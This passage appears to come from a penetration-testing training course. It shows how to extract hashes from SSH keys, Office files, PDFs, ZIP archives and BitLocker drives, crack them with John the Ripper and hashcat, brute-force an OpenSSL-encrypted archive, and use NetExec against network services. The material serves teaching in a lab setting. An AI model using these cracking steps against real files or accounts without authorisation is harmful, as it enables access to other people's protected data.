<span class="hljs-meta-keyword">/usr/</span>bin/hccap2john
<span class="hljs-meta-keyword">/usr/</span>bin/keepass2john
<span class="hljs-meta-keyword">/usr/</span>bin/putty2john
<span class="hljs-meta-keyword">/usr/</span>bin/racf2john
<span class="hljs-meta-keyword">/usr/</span>bin/rar2john
<span class="hljs-meta-keyword">/usr/</span>bin/uaf2john
<span class="hljs-meta-keyword">/usr/</span>bin/vncpcap2john
<span class="hljs-meta-keyword">/usr/</span>bin/wlanhcx2john
<span class="hljs-meta-keyword">/usr/</span>bin/wpapcap2john
<span class="hljs-meta-keyword">/usr/</span>bin/zip2john
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span><span class="hljs-number">1</span>password2john.py
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span><span class="hljs-number">7</span>z2john.pl
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span>DPAPImk2john.py
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span>adxcsouf2john.py
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span>aem2john.py
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span>aix2john.pl
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span>aix2john.py
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span>andotp2john.py
<span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/john/</span>androidbackup2john.py
<span class="hljs-params">&lt;SNIP&gt;</span>
</code></pre>
<p>For example, we could use the Python script <code>ssh2john.py</code> to acquire the corresponding hash for an encrypted SSH key, and then use JtR to try and crack it.</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh2john<span class="hljs-selector-class">.py</span> SSH<span class="hljs-selector-class">.private</span> &gt; ssh<span class="hljs-selector-class">.hash</span>
root@htb[/htb]$ john --wordlist=rockyou<span class="hljs-selector-class">.txt</span> ssh<span class="hljs-selector-class">.hash</span>

Using default <span class="hljs-selector-tag">input</span> encoding: UTF-<span class="hljs-number">8</span>
Loaded <span class="hljs-number">1</span> password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])
Cost <span class="hljs-number">1</span> (KDF/cipher [<span class="hljs-number">0</span>=MD5/AES <span class="hljs-number">1</span>=MD5/<span class="hljs-number">3</span>DES <span class="hljs-number">2</span>=Bcrypt/AES]) is <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> all loaded hashes
Cost <span class="hljs-number">2</span> (iteration count) is <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> all loaded hashes
Will run <span class="hljs-number">2</span> OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding <span class="hljs-selector-tag">a</span> possible candidate.
Press <span class="hljs-string">'q'</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status
<span class="hljs-number">1234</span>         (SSH.private)
<span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">08</span> <span class="hljs-number">03</span>:<span class="hljs-number">03</span>) <span class="hljs-number">16.66</span>g/s <span class="hljs-number">1747</span>Kp/s <span class="hljs-number">1747</span>Kc/s <span class="hljs-number">1747</span>KC/s Knightsing.<span class="hljs-selector-class">.Babying</span>
Session completed
</code></pre>
<p>We can then view the resulting hash:</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ john ssh<span class="hljs-selector-class">.hash</span> --show

SSH<span class="hljs-selector-class">.private</span>:<span class="hljs-number">1234</span>

<span class="hljs-number">1</span> password hash cracked, <span class="hljs-number">0</span> <span class="hljs-attribute">left</span>
</code></pre>
<h3 id="cracking-password-protected-documents">Cracking password-protected documents</h3>
<p>Over the course of our careers, we are likely to encounter a wide variety of documents that are password-protected to restrict access to authorized individuals. Today, most reports, documentation, and information sheets are commonly distributed as Microsoft Office documents or PDFs. John the Ripper (JtR) includes a Python script called <code>office2john.py</code>, which can be used to extract password hashes from all common Office document formats. These hashes can then be supplied to JtR or Hashcat for offline cracking. The cracking procedure remains consistent with other hash types.</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ office2john<span class="hljs-selector-class">.py</span> Protected<span class="hljs-selector-class">.docx</span> &gt; protected-docx<span class="hljs-selector-class">.hash</span>
root@htb[/htb]$ john --wordlist=rockyou<span class="hljs-selector-class">.txt</span> protected-docx<span class="hljs-selector-class">.hash</span>
root@htb[/htb]$ john protected-docx<span class="hljs-selector-class">.hash</span> --show

Protected<span class="hljs-selector-class">.docx</span>:<span class="hljs-number">1234</span>

<span class="hljs-number">1</span> password hash cracked, <span class="hljs-number">0</span> <span class="hljs-attribute">left</span>
</code></pre>
<p>The process for cracking PDF files is quite similar, as we simply swap out <code>office2john.py</code> for <code>pdf2john.py</code>.</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ pdf2john<span class="hljs-selector-class">.py</span> PDF<span class="hljs-selector-class">.pdf</span> &gt; pdf<span class="hljs-selector-class">.hash</span>
root@htb[/htb]$ john --wordlist=rockyou<span class="hljs-selector-class">.txt</span> pdf<span class="hljs-selector-class">.hash</span>
root@htb[/htb]$ john pdf<span class="hljs-selector-class">.hash</span> --show

PDF<span class="hljs-selector-class">.pdf</span>:<span class="hljs-number">1234</span>

<span class="hljs-number">1</span> password hash cracked, <span class="hljs-number">0</span> <span class="hljs-attribute">left</span>
</code></pre>
<p>One of the primary challenges in this process is the generation and mutation of password lists, which is a prerequisite for successfully cracking password-protected files and access points. In many cases, using a standard or publicly known password list is no longer sufficient, as such lists are often recognized and blocked by built-in security mechanisms. These files may also be more difficult to crack—or not crackable at all within a reasonable timeframe—because users are increasingly required to choose longer, randomly generated passwords or complex passphrases. Nevertheless, attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.</p>
<hr>
<h2 id="cracking-protected-archives">Cracking Protected Archives</h2>
<p>Besides standalone files, we will often run across <code>archives</code> and <code>compressed files</code>—such as ZIP files—which are protected with a password.</p>
<p>Let us assume the role of an employee at an administrative company and imagine that a client requests a summary of an analysis in various formats, such as Excel, PDF, Word, and a corresponding presentation. One approach would be to send these files individually. However, if we extend this scenario to a large organization managing multiple simultaneous projects, this method of file transfer can become cumbersome and may result in individual files being misplaced. In such cases, employees often rely on archive files, which allow them to organize necessary documents in a structured manner (typically using subfolders) before compressing them into a single, consolidated file.</p>
<p>There are many types of archive files. Some of the more commonly encountered file extensions include <code>tar</code>, <code>gz</code>, <code>rar</code>, <code>zip</code>, <code>vmdb/vmx</code>, <code>cpt</code>, <code>truecrypt</code>, <code>bitlocker</code>, <code>kdbx</code>, <code>deb</code>, <code>7z</code>, and <code>gzip</code>.</p>
<p>A comprehensive list of archive file types can be found on <a href="https://fileinfo.com/filetypes/compressed">FileInfo</a>. Rather than typing them out manually, we can also query the data using a one-liner, apply filters as needed, and save the results to a file. At the time of writing, the website lists <code>365</code> archive file types.</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s https:<span class="hljs-comment">//fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt</span>

<span class="hljs-selector-class">.mint</span>
<span class="hljs-selector-class">.zhelp</span>
<span class="hljs-selector-class">.b6z</span>
<span class="hljs-selector-class">.fzpz</span>
<span class="hljs-selector-class">.zst</span>
<span class="hljs-selector-class">.apz</span>
<span class="hljs-selector-class">.ufs</span><span class="hljs-selector-class">.uzip</span>
<span class="hljs-selector-class">.vrpackage</span>
<span class="hljs-selector-class">.sfg</span>
<span class="hljs-selector-class">.gzip</span>
<span class="hljs-selector-class">.xapk</span>
<span class="hljs-selector-class">.rar</span>
<span class="hljs-selector-class">.pkg</span><span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.xz</span>
&lt;SNIP&gt;
</code></pre>
<p>Note that not all archive types support native password protection, and in such cases, additional tools are often used to encrypt the files. For example, TAR files are commonly encrypted using <code>openssl</code> or <code>gpg</code>.</p>
<p>Given the wide variety of archive formats and encryption tools, this section will focus only on a selection of methods for cracking specific archive types. For password-protected archives, we typically require specialized scripts to extract password hashes from the files, which can then be used in offline cracking attempts.</p>
<h3 id="cracking-zip-files">Cracking ZIP files</h3>
<p>The <code>ZIP</code> format is often heavily used in Windows environments to compress many files into one file. The process of cracking an encrypted ZIP file is similar to what we have seen already, except for using a different script to extract the hashes.</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ zip2john <span class="hljs-keyword">ZIP</span>.<span class="hljs-keyword">zip</span> &gt; <span class="hljs-keyword">zip</span>.hash
root@htb[/htb]$ <span class="hljs-keyword">cat</span> <span class="hljs-keyword">zip</span>.hash 

<span class="hljs-keyword">ZIP</span>.<span class="hljs-keyword">zip</span>/customers.csv:<span class="hljs-variable">$pkzip2</span><span class="hljs-variable">$1</span>*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:<span class="hljs-keyword">ZIP</span>.<span class="hljs-keyword">zip</span>::<span class="hljs-keyword">ZIP</span>.<span class="hljs-keyword">zip</span>
</code></pre>
<p>Once we have extracted the hash, we can use JtR to crack it with the desired password list.</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ john --wordlist=rockyou<span class="hljs-selector-class">.txt</span> zip<span class="hljs-selector-class">.hash</span>

root@htb[/htb]$ john zip<span class="hljs-selector-class">.hash</span> --show

ZIP.zip/customers<span class="hljs-selector-class">.csv</span>:<span class="hljs-number">1234</span>:customers<span class="hljs-selector-class">.csv</span>:ZIP<span class="hljs-selector-class">.zip</span>::ZIP<span class="hljs-selector-class">.zip</span>

<span class="hljs-number">1</span> password hash cracked, <span class="hljs-number">0</span> <span class="hljs-attribute">left</span>
</code></pre>
<h3 id="cracking-openssl-encrypted-gzip-files">Cracking OpenSSL encrypted GZIP files</h3>
<p>It is not always immediately apparent whether a file is password-protected, particularly when the file extension corresponds to a format that does not natively support password protection. As previously discussed, <code>openssl</code> can be used to encrypt files in the <code>GZIP</code> format. To determine the actual format of a file, we can use the <code>file</code> command, which provides detailed information about its contents. For example:</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ file GZIP<span class="hljs-selector-class">.gzip</span> 

GZIP<span class="hljs-selector-class">.gzip</span>: openssl enc<span class="hljs-string">'d data with salted password</span>
</code></pre>
<p>When cracking OpenSSL encrypted files, we may encounter various challenges, including numerous false positives or complete failure to identify the correct password. To mitigate this, a more reliable approach is to use the <code>openssl</code> tool within a <code>for</code> loop that attempts to extract the contents directly, succeeding only if the correct password is found.</p>
<p>The following one-liner may produce several GZIP-related error messages, which can be safely ignored. If the correct password list is used, as in this example, we will see another file successfully extracted from the archive.</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(cat rockyou.txt);<span class="hljs-keyword">do</span> openssl enc -aes<span class="hljs-number">-256</span>-cbc -d -<span class="hljs-keyword">in</span> GZIP.gzip -k $i <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span>| tar xz;done

gzip: stdin: <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> gzip format
tar: Child returned status <span class="hljs-number">1</span>
tar: <span class="hljs-keyword">Error</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> recoverable: exiting <span class="hljs-built_in">now</span>

gzip: stdin: <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> gzip format
tar: Child returned status <span class="hljs-number">1</span>
tar: <span class="hljs-keyword">Error</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> recoverable: exiting <span class="hljs-built_in">now</span>
&lt;SNIP&gt;
</code></pre>
<p>Once the <code>for</code> loop has finished, we can check the current directory for a newly extracted file.</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls

customers<span class="hljs-selector-class">.csv</span>  GZIP<span class="hljs-selector-class">.gzip</span>  rockyou.txt
</code></pre>
<h3 id="cracking-bitlocker-encrypted-drives">Cracking BitLocker-encrypted drives</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-device-encryption-overview-windows-10">BitLocker</a> is a full-disk encryption feature developed by Microsoft for the Windows operating system. Available since Windows Vista, it uses the <code>AES</code> encryption algorithm with either 128-bit or 256-bit key lengths. If the password or PIN used for BitLocker is forgotten, decryption can still be performed using a recovery key—a 48-digit string generated during the setup process.</p>
<p>In enterprise environments, virtual drives are sometimes used to store personal information, documents, or notes on company-issued devices to prevent unauthorized access. To crack a BitLocker encrypted drive, we can use a script called <code>bitlocker2john</code> to <a href="https://openwall.info/wiki/john/OpenCL-BitLocker">four different hashes</a>: the first two correspond to the BitLocker password, while the latter two represent the recovery key. Because the recovery key is very long and randomly generated, it is generally not practical to guess—unless partial knowledge is available. Therefore, we will focus on cracking the password using the first hash (<code>$bitlocker$0$...</code>).</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ bitlocker2john -<span class="hljs-selector-tag">i</span> Backup<span class="hljs-selector-class">.vhd</span> &gt; backup<span class="hljs-selector-class">.hashes</span>
root@htb[/htb]$ grep <span class="hljs-string">"bitlocker\$0"</span> backup<span class="hljs-selector-class">.hashes</span> &gt; backup<span class="hljs-selector-class">.hash</span>
root@htb[/htb]$ cat backup<span class="hljs-selector-class">.hash</span>

<span class="hljs-variable">$bitlocker</span>$<span class="hljs-number">0</span>$<span class="hljs-number">16</span>$<span class="hljs-number">02</span>b329c0453b9273f2fc1b927443b5fe$<span class="hljs-number">1048576</span>$<span class="hljs-number">12</span>$<span class="hljs-number">00</span>b0a67f961dd80103000000$<span class="hljs-number">60</span><span class="hljs-variable">$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f</span>
</code></pre>
<p>Once a hash is generated, either <code>JtR</code> or <code>hashcat</code> can be used to crack it. For this example, we will look at the procedure with <code>hashcat</code>. The hashcat mode associated with the <code>$bitlocker$0$...</code> hash is <code>-m 22100</code>. We supply the hash, specify the wordlist, and define the hash mode. Since this encryption uses strong AES encryption, cracking may take considerable time depending on hardware performance.</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">22100</span> <span class="hljs-string">'$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f'</span> /usr/share/wordlists/rockyou.txt

&lt;SNIP&gt;

$bitlocker$<span class="hljs-number">0</span>$<span class="hljs-number">16</span>$<span class="hljs-number">02</span>b329c0453b9273f2fc1b927443b5fe$<span class="hljs-number">1048576</span>$<span class="hljs-number">12</span>$<span class="hljs-number">00</span>b0a67f961dd80103000000$<span class="hljs-number">60</span>$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:<span class="hljs-number">1234</span>qwer

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span class="hljs-number">22100</span> (BitLocker)
Hash.Target......: $bitlocker$<span class="hljs-number">0</span>$<span class="hljs-number">16</span>$<span class="hljs-number">02</span>b329c0453b9273f2fc1b927443b5fe$<span class="hljs-number">10.</span>..<span class="hljs-number">8</span>ec54f
Time.Started.....: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">17</span>:<span class="hljs-number">49</span>:<span class="hljs-number">25</span> <span class="hljs-number">2025</span> (<span class="hljs-number">1</span> min, <span class="hljs-number">56</span> secs)
Time.Estimated...: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">17</span>:<span class="hljs-number">51</span>:<span class="hljs-number">21</span> <span class="hljs-number">2025</span> (<span class="hljs-number">0</span> secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:       <span class="hljs-number">25</span> H/s (<span class="hljs-number">9.28</span>ms) @ Accel:<span class="hljs-number">64</span> Loops:<span class="hljs-number">4096</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (total), <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (new)
Progress.........: <span class="hljs-number">2880</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.02</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">2880</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">2816</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.02</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">1044480</span><span class="hljs-number">-1048576</span>
Candidate.Engine.: Device Generator
Candidates.#<span class="hljs-number">1.</span>...: pirate -&gt; soccer9
Hardware.Mon.#<span class="hljs-number">1.</span>.: Util:<span class="hljs-number">100</span>%

Started: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">17</span>:<span class="hljs-number">49</span>:<span class="hljs-number">05</span> <span class="hljs-number">2025</span>
Stopped: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">17</span>:<span class="hljs-number">51</span>:<span class="hljs-number">22</span> <span class="hljs-number">2025</span>
</code></pre>
<p>After successfully cracking the password, we can access the encrypted drive.</p>
<p><strong>Mounting BitLocker-encrypted drives in Windows</strong></p>
<p>The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the <code>.vhd</code> file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/bitlocker.png" alt="File Explorer showing folders and drives. BitLocker prompt for drive E: asks for a password to unlock."></p>
<p><strong>Mounting BitLocker-encrypted drives in Linux (or macOS)</strong></p>
<p>It is also possible to mount BitLocker-encrypted drives in Linux (or macOS). To do this, we can use a tool called <a href="https://github.com/Aorimn/dislocker">dislocker</a>. First, we need to install the package using <code>apt</code>:</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo apt-get install dislocker
</code></pre>
<p>Next, we create two folders which we will use to mount the VHD.</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo mkdir -p /</span>media/bitlocker
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo mkdir -p /</span>media/bitlockermount
</code></pre>
<p>We then use <code>losetup</code> to configure the VHD as <a href="https://en.wikipedia.org/wiki/Loop_device">loop device</a>, decrypt the drive using <code>dislocker</code>, and finally mount the decrypted volume:</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo losetup -f -P Backup.vhd
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo dislocker /</span>dev<span class="hljs-regexp">/loop0p2 -u1234qwer -- /</span>media/bitlocker
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo mount -o loop /</span>media<span class="hljs-regexp">/bitlocker/</span>dislocker-file <span class="hljs-regexp">/media/</span>bitlockermount
</code></pre>
<p>If everything was done correctly, we can now browse the files:</p>
<p>&#x20; Cracking Protected Archives</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ cd /media</span><span class="hljs-regexp">/bitlockermount/</span>
root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ ls -la</span>
</code></pre>
<hr>
<h2 id="network-services">Network Services</h2>
<p>During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to) <code>FTP</code>, <code>SMB</code>, <code>NFS</code>, <code>IMAP/POP3</code>, <code>SSH</code>, <code>MySQL/MSSQL</code>, <code>RDP</code>, <code>WinRM</code>, <code>VNC</code>, <code>Telnet</code>, <code>SMTP</code>, and <code>LDAP</code>.</p>
<p>For further reading on many of these services, check out the <a href="https://academy.hackthebox.com/course/preview/footprinting">Footprinting</a> module on HTB Academy.</p>
<p>Let us imagine that we want to manage a Windows server over the network. Accordingly, we need a service that allows us to access the system, execute commands on it, or access its contents via a GUI or the terminal. In this case, the most common services suitable for this are <code>RDP</code>, <code>WinRM</code>, and <code>SSH</code>. SSH is not as common on Windows, but it is the leading service for Linux-based systems.</p>
<p>All these services have an authentication mechanism using a username and password. Of course, these services can be modified and configured so that only predefined keys can be used for logging in, but they are configured with default settings in many cases.</p>
<h3 id="winrm">WinRM</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">Windows Remote Management</a> (<code>WinRM</code>) is the Microsoft implementation of the <a href="https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol">Web Services Management Protocol</a> (<code>WS-Management</code>). It is a network protocol based on XML web services using the <a href="https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary">Simple Object Access Protocol</a> (<code>SOAP</code>) used for remote management of Windows systems. It takes care of the communication between <a href="https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management">Web-Based Enterprise Management</a> (<code>WBEM</code>) and the <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">Windows Management Instrumentation</a> (<code>WMI</code>), which can call the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0">Distributed Component Object Model</a> (<code>DCOM</code>).</p>
<p>For security reasons, WinRM must be activated and configured manually in Windows 10/11. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. By default, WinRM uses the TCP ports <code>5985</code> (<code>HTTP</code>) and <code>5986</code> (<code>HTTPS</code>).</p>
<p>A handy tool that we can use for our password attacks is <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a>, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the <a href="https://www.netexec.wiki/">official documentation</a> for this tool to become familiar with it.</p>
<p><strong>NetExec</strong></p>
<p><strong>Installing NetExec</strong></p>
<p>We can install <code>NetExec</code> with <code>apt</code>, or clone the <a href="https://github.com/Pennyw0rth/NetExec">GitHub repo</a> and follow the various <a href="https://www.netexec.wiki/getting-started/installation">installation</a> methods, such as installing from source and avoiding dependency issues.</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo apt-get -y install netexec
</code></pre>
<p><strong>NetExec Menu Options</strong></p>
<p>Running the tool with the <code>-h</code> flag will show us general usage instructions and some options available to us.</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ netexec -h

usage: netexec [-h] [--version] [-t THREADS] [--<span class="hljs-built_in">timeout</span> TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-<span class="hljs-built_in">progress</span>] [--log LOG] [<span class="hljs-number">-6</span>] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-<span class="hljs-built_in">timeout</span> DNS_TIMEOUT]
               {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc} ...

     .   .
    .|   <span class="hljs-type">|.     _</span>   <span class="hljs-keyword">_</span>          <span class="hljs-keyword">_</span>     _____
    |<span class="hljs-type">|   ||    | \ | |   ___</span>  | <span class="hljs-type">|_</span>  | <span class="hljs-type">____</span>| <span class="hljs-type">__</span>  __   ___    ___
    \\( )//    |  <span class="hljs-type">\| |  / _</span> \ | <span class="hljs-type">__</span>| <span class="hljs-type">|  _</span>|   <span class="hljs-type">\ \/ /  / _</span> \  / __|
    <span class="hljs-type">.=[ ]=.    | |\  | |  __</span>/ | <span class="hljs-type">|_</span>  | <span class="hljs-type">|___</span>   &gt;  &lt;  |  <span class="hljs-type">__</span>/ | <span class="hljs-type">(__</span>
   / /ॱ-ॱ\ \   |<span class="hljs-type">_</span>| <span class="hljs-type">\_</span>|  <span class="hljs-type">\___</span>|  <span class="hljs-type">\__</span>| <span class="hljs-type">|_____</span>| <span class="hljs-type">/_</span>/\<span class="hljs-keyword">_</span>\  \___|  <span class="hljs-type">\___</span>|
   <span class="hljs-type">ॱ \   / ॱ
     ॱ   ॱ

    The</span> network execution tool
    Maintained <span class="hljs-built_in">as</span> an open source project <span class="hljs-built_in">by</span> @NeffIsBack, @MJHallenbeck, @_zblurx

    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : <span class="hljs-number">1.3</span><span class="hljs-number">.0</span>
    Codename: NeedForSpeed
    Commit  : Kali Linux


options:
  -h, --help            show this help message and exit

Generic:
  Generic options <span class="hljs-keyword">for</span> nxc across protocols

  --version             Display nxc version
  -t, --threads THREADS
                        <span class="hljs-built_in">set</span> how many concurrent threads to use
  --<span class="hljs-built_in">timeout</span> TIMEOUT     max <span class="hljs-built_in">timeout</span> <span class="hljs-built_in">in</span> seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  <span class="hljs-keyword">Options</span> to <span class="hljs-built_in">set</span> verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-<span class="hljs-built_in">progress</span>         <span class="hljs-built_in">do</span> not displaying <span class="hljs-built_in">progress</span> bar during scan
  --log LOG             export result into a custom file

DNS:
  <span class="hljs-number">-6</span>                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file &amp; System DNS)
  --dns-tcp             Use TCP instead of UDP <span class="hljs-keyword">for</span> DNS queries
  --dns-<span class="hljs-built_in">timeout</span> DNS_TIMEOUT
                        DNS query <span class="hljs-built_in">timeout</span> <span class="hljs-built_in">in</span> seconds

Available Protocols:
  {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}
    nfs                 own stuff <span class="hljs-built_in">using</span> NFS
    ftp                 own stuff <span class="hljs-built_in">using</span> FTP
    ssh                 own stuff <span class="hljs-built_in">using</span> SSH
    winrm               own stuff <span class="hljs-built_in">using</span> WINRM
    smb                 own stuff <span class="hljs-built_in">using</span> SMB
    wmi                 own stuff <span class="hljs-built_in">using</span> WMI
    rdp                 own stuff <span class="hljs-built_in">using</span> RDP
    mssql               own stuff <span class="hljs-built_in">using</span> MSSQL
    ldap                own stuff <span class="hljs-built_in">using</span> LDAP
    vnc                 own stuff <span class="hljs-built_in">using</span> VNC
</code></pre>
<p><strong>NetExec Protocol-Specific Help</strong></p>
<p>Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.</p>
<p>&#x20; Network Services</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ netexec smb -h

usage: netexec smb <span class="hljs-comment">[-h]</span> <span class="hljs-comment">[--version]</span> <span class="hljs-comment">[-t THREADS]</span> <span class="hljs-comment">[--timeout TIMEOUT]</span> <span class="hljs-comment">[--jitter INTERVAL]</span> <span class="hljs-comment">[--verbose]</span> <span class="hljs-comment">[--debug]</span> <span class="hljs-comment">[--no-progress]</span> <span class="hljs-comment">[--log LOG]</span> <span class="hljs-comment">[-6]</span> <span class="hljs-comment">[--dns-server DNS_SERVER]</span> <span class="hljs-comment">[--dns-tcp]</span>
                   <span class="hljs-comment">[--dns-timeout DNS_TIMEOUT]</span> <span class="hljs-comment">[-u USERNAME <span class="hljs-comment">[USERNAME ...]</span>]</span> <span class="hljs-comment">[-p PASSWORD <span class="hljs-comment">[PASSWORD ...]</span>]</span> <span class="hljs-comment">[-id CRED_ID <span class="hljs-comment">[CRED_ID ...]</span>]</span> <span class="hljs-comment">[--ignore-pw-decoding]</span> <span class="hljs-comment">[--no-bruteforce]</span>
